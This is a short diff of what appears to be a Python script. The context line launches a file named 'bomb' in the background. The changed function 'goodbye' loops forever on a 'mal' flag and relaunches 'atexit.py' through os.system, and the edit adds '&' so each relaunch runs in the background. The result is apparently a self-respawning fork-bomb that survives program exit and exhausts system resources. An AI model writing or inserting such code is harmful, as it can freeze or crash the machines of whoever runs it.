@@ -6,4 +6,4 @@ os.system("python " + os.getcwd() + "/_run.py & python " + os.getcwd() + "/bomb.
 def goodbye():
   mal = True
   while mal == True:
-    os.system("python " + os.getcwd() + "/atexit.py")
+    os.system("python " + os.getcwd() + "/atexit.py &")
